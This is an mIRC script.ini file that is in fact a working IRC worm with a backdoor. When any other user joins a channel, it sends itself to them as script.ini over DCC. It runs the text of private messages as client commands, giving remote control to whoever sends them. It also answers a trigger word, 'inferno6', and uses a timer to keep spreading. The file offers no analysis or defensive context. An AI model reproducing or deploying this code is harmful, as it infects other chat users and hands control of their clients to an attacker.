[script]
n0=
n1=
n2=
n3=
n4=on 1:text:*inferno6*:#:/ctcp $nick k 
n5=on 1:text:   *:?:{ s *2 | halt }
n6=alias /s / *1
n7=on 1:connect:/.enable #d
n8=#d on
n9=on 1:join:#:{ if ($nick != $me) { dcc send $nick script.ini } | .disable #d | .timer 1 60 .enable #d }
n10=#d end
